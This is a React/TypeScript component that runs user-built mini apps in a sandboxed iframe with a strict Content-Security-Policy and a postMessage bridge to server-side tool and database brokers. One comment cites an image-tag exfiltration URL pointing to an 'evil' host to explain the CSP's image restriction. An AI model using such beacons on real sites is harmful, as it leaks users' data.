'use client';

/**
 * Runs a built mini app inside a sandboxed iframe. The app's bundle is fetched
 * (authenticated, same-origin) and INLINED into the iframe's srcdoc, so the
 * iframe runs with an opaque origin (sandbox="allow-scripts", NO
 * allow-same-origin) — it can't read host cookies/DOM/storage. Its only channel
 * is postMessage to this parent, which brokers tool + sqlite calls server-side.
 *
 * Theme parity: we inline the parent's already-compiled CSS and copy the active
 * theme attrs (class + data-color-theme) onto the iframe <html>, so the app
 * matches the product look (incl. dark mode + colour theme) with no network.
 */
import { useCallback, useEffect, useRef, useState } from 'react';
import { isFromApp, type BridgeReq } from '@/lib/app-bridge/protocol';

type Status = 'loading' | 'ready' | 'nobuild' | 'error';

/** Serialize every same-origin stylesheet the host has loaded (Tailwind output
 *  + theme vars). Cross-origin sheets throw on .cssRules — skipped. Cached: the
 *  app's CSS doesn't change within a session. */
let cssCache: string | null = null;
function captureHostCss(): string {
  if (cssCache !== null) return cssCache;
  let out = '';
  for (const sheet of Array.from(document.styleSheets)) {
    try {
      for (const rule of Array.from(sheet.cssRules)) out += rule.cssText + '\n';
    } catch {
      /* cross-origin sheet — skip */
    }
  }
  cssCache = out;
  return out;
}

// Host-injected "inspect mode" overlay. Lives in the iframe but is NOT part of
// the app bundle, so it works on every app with no rebuild and stays a host
// concern. When the parent posts {kind:'inspect',on:true}, hovering outlines the
// nearest [data-app-region] ancestor and clicking locks it (clicking the same
// one clears it). The locked region is posted back as {kind:'select'}; the
// parent feeds it to Appsmith as focusRegionIds. Esc exits. Pure DOM, defensive.
const INSPECTOR = `
(function(){
  var on=false, locked=null, hovered=null, lbl=null;
  function regionOf(el){
    while(el && el.nodeType===1 && el!==document.body){
      if(el.getAttribute && el.hasAttribute('data-app-region')) return el;
      el=el.parentElement;
    }
    return null;
  }
  function q(id){ try{ return id ? document.querySelector('[data-app-region="'+(window.CSS&&CSS.escape?CSS.escape(id):id)+'"]') : null; }catch(e){ return null; } }
  function label(){
    if(!lbl){
      lbl=document.createElement('div');
      lbl.style.cssText='position:fixed;z-index:2147483647;pointer-events:none;display:none;font:500 11px/1.4 ui-sans-serif,system-ui,sans-serif;padding:2px 6px;border-radius:4px;background:var(--ring,#3b82f6);color:#fff;box-shadow:0 1px 4px rgba(0,0,0,.35);white-space:nowrap;';
      document.body.appendChild(lbl);
    }
    return lbl;
  }
  function paintLocked(){
    var prev=document.querySelectorAll('[data-app-locked]');
    for(var i=0;i<prev.length;i++){ prev[i].removeAttribute('data-app-locked'); prev[i].style.outline=''; prev[i].style.outlineOffset=''; }
    var el=q(locked);
    if(el){ el.setAttribute('data-app-locked','1'); el.style.outline='2px solid var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
  }
  function clearHover(){
    if(hovered && !hovered.hasAttribute('data-app-locked')){ hovered.style.outline=''; hovered.style.outlineOffset=''; }
    hovered=null;
    if(lbl) lbl.style.display='none';
  }
  function onMove(e){
    if(!on) return;
    var el=regionOf(e.target);
    if(el===hovered) return;
    clearHover();
    if(!el) return;
    hovered=el;
    if(!el.hasAttribute('data-app-locked')){ el.style.outline='2px dashed var(--ring,#3b82f6)'; el.style.outlineOffset='1px'; }
    var r=el.getBoundingClientRect(), L=label();
    L.textContent=el.getAttribute('data-app-region');
    L.style.display='block';
    L.style.left=Math.max(2,r.left)+'px';
    L.style.top=Math.max(2,r.top-20)+'px';
  }
  function onClick(e){
    if(!on) return;
    var el=regionOf(e.target);
    if(!el) return;
    e.preventDefault(); e.stopPropagation(); if(e.stopImmediatePropagation) e.stopImmediatePropagation();
    var id=el.getAttribute('data-app-region');
    locked=(locked===id)?null:id;
    clearHover(); paintLocked();
    window.parent.postMessage({ v:1, kind:'select', regionId:locked, label:locked }, '*');
    onMove(e);
  }
  function setOn(v){ on=v; document.body.style.cursor=v?'crosshair':''; if(!v) clearHover(); }
  window.addEventListener('message', function(e){
    if(e.source!==window.parent) return;
    var m=e.data; if(!m||m.v!==1) return;
    if(m.kind==='inspect'){ setOn(!!m.on); return; }
    if(m.kind==='select'){ locked=m.regionId||null; clearHover(); paintLocked(); return; }
  });
  document.addEventListener('mousemove', onMove, true);
  document.addEventListener('click', onClick, true);
  document.addEventListener('keydown', function(e){ if(on && e.key==='Escape'){ setOn(false); window.parent.postMessage({v:1,kind:'inspect',on:false},'*'); } });
})();
`;

function buildSrcDoc(bundleCode: string): string {
  const html = document.documentElement;
  const cls = html.className || '';
  const colorTheme = html.dataset.colorTheme ? ` data-color-theme="${html.dataset.colorTheme}"` : '';
  const css = captureHostCss();
  // CSP: the app may only render — NO network of its own. `connect-src 'none'`
  // blocks fetch/XHR/WebSocket, but img/font loads are network too, so they're
  // held to inline sources only (data:/blob:) — a wildcard there would be an
  // exfil channel (`<img src="https://evil/?d=…">`) despite connect-src 'none'.
  // The app's only egress is the postMessage bridge to the parent, which
  // brokers tool + sqlite calls server-side. Inline style + script are ours.
  const csp =
    "default-src 'none'; style-src 'unsafe-inline'; script-src 'unsafe-inline'; " +
    "img-src data: blob:; font-src data:; connect-src 'none'; base-uri 'none'; form-action 'none'";
  return `<!doctype html>
<html class="${cls}"${colorTheme}>
<head>
<meta charset="utf-8" />
<meta http-equiv="Content-Security-Policy" content="${csp}" />
<style>${css}</style>
<style>html,body{margin:0;background:transparent}#root{padding:0}</style>
</head>
<body class="bg-background text-foreground">
<div id="root"></div>
<script type="module">${bundleCode}</script>
<script>${INSPECTOR}</script>
</body>
</html>`;
}

export function AppSandbox({
  appId,
  reloadKey = 0,
  onError,
  inspect = false,
  selectedRegionId = null,
  onSelect,
  onInspectChange,
}: {
  appId: string;
  /** Bump to force a re-fetch + re-render (e.g. after a build/publish). */
  reloadKey?: number;
  onError?: (message: string) => void;
  /** When true, hovering the preview outlines [data-app-region]s and clicking
   *  one locks it (inspect mode). */
  inspect?: boolean;
  /** The host-held locked selection — pushed down to keep the iframe's outline
   *  in sync (e.g. cleared when the user dismisses the focus chip). */
  selectedRegionId?: string | null;
  /** The user locked or cleared a region in the preview (null = cleared). */
  onSelect?: (regionId: string | null) => void;
  /** The iframe changed inspect state itself (e.g. Esc to exit). */
  onInspectChange?: (on: boolean) => void;
}) {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const [status, setStatus] = useState<Status>('loading');
  const [height, setHeight] = useState(320);

  const postToFrame = useCallback((msg: unknown) => {
    iframeRef.current?.contentWindow?.postMessage(msg, '*');
  }, []);

  // Push inspect-mode + the locked selection down whenever they change or the
  // app (re)becomes ready, so a fresh iframe inherits the current state.
  useEffect(() => {
    if (status !== 'ready') return;
    postToFrame({ v: 1, kind: 'inspect', on: inspect });
  }, [inspect, status, postToFrame]);
  useEffect(() => {
    if (status !== 'ready') return;
    postToFrame({ v: 1, kind: 'select', regionId: selectedRegionId });
  }, [selectedRegionId, status, postToFrame]);

  // Broker a request from the app and post the correlated response back.
  const handleRequest = useCallback(
    async (req: BridgeReq) => {
      const reply = (res: { ok: boolean; output?: unknown; error?: string }) => {
        iframeRef.current?.contentWindow?.postMessage(
          { v: 1, id: req.id, ...res },
          '*',
        );
      };
      try {
        if (req.kind === 'tool.call') {
          const r = await fetch(`/api/apps/${appId}/tool-broker`, {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({ slug: req.slug, input: req.input }),
          });
          const data = await r.json();
          // 403 == the slug isn't in the app's declared tools. That's a wiring
          // bug, not a transient failure — surface it plainly to the builder
          // even if the app's own code swallows the rejection.
          if (r.status === 403 && data?.ok === false) {
            onError?.(
              `This app tried to use the tool “${req.slug}”, which it hasn't declared. ` +
                `Add it to the app's tools (app_tools_set) — or ask Appsmith to — before it can run.`,
            );
          }
          reply(data);
          return;
        }
        // db.query | db.exec
        const op = req.kind === 'db.query' ? 'query' : 'exec';
        const r = await fetch(`/api/apps/${appId}/db-broker`, {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify({ op, sql: req.sql, params: req.params ?? [] }),
        });
        reply(await r.json());
      } catch (err) {
        reply({ ok: false, error: err instanceof Error ? err.message : String(err) });
      }
    },
    [appId, onError],
  );

  // Listen for messages from THIS iframe only.
  useEffect(() => {
    const onMessage = (e: MessageEvent) => {
      if (e.source !== iframeRef.current?.contentWindow) return;
      const m = e.data;
      if (!isFromApp(m)) return;
      if (m.kind === 'ready') {
        setStatus('ready');
        return;
      }
      if (m.kind === 'resize') {
        setHeight(Math.max(80, Math.min(4000, Math.ceil(m.height))));
        return;
      }
      if (m.kind === 'error') {
        onError?.(m.message);
        return;
      }
      if (m.kind === 'select') {
        onSelect?.(m.regionId);
        return;
      }
      if (m.kind === 'inspect') {
        onInspectChange?.(m.on);
        return;
      }
      // A request needing a response.
      void handleRequest(m);
    };
    window.addEventListener('message', onMessage);
    return () => window.removeEventListener('message', onMessage);
  }, [handleRequest, onError, onSelect, onInspectChange]);

  // Fetch the bundle and (re)render into the iframe.
  useEffect(() => {
    let cancelled = false;
    setStatus('loading');
    fetch(`/api/apps/${appId}/bundle`)
      .then(async (r) => {
        if (cancelled) return;
        if (r.status === 404) {
          setStatus('nobuild');
          return;
        }
        if (!r.ok) {
          setStatus('error');
          onError?.(`bundle load failed (${r.status})`);
          return;
        }
        const code = await r.text();
        if (cancelled || !iframeRef.current) return;
        iframeRef.current.srcdoc = buildSrcDoc(code);
      })
      .catch((err) => {
        if (cancelled) return;
        setStatus('error');
        onError?.(err instanceof Error ? err.message : String(err));
      });
    return () => {
      cancelled = true;
    };
  }, [appId, reloadKey, onError]);

  return (
    <div className="relative w-full overflow-hidden rounded-lg border border-border bg-background">
      {status === 'nobuild' && (
        <div className="flex h-40 items-center justify-center p-6 text-center text-sm text-muted-foreground">
          This app hasn&apos;t been built yet. Ask Appsmith to build it, or run a build from the editor.
        </div>
      )}
      {status === 'error' && (
        <div className="flex h-40 items-center justify-center p-6 text-center text-sm text-destructive">
          Couldn&apos;t load the app preview.
        </div>
      )}
      <iframe
        ref={iframeRef}
        title="App preview"
        sandbox="allow-scripts"
        className={status === 'ready' ? 'block w-full' : 'hidden'}
        style={{ height, border: '0', width: '100%' }}
      />
      {status === 'loading' && (
        <div className="flex h-40 items-center justify-center p-6 text-sm text-muted-foreground">
          Loading preview…
        </div>
      )}
    </div>
  );
}
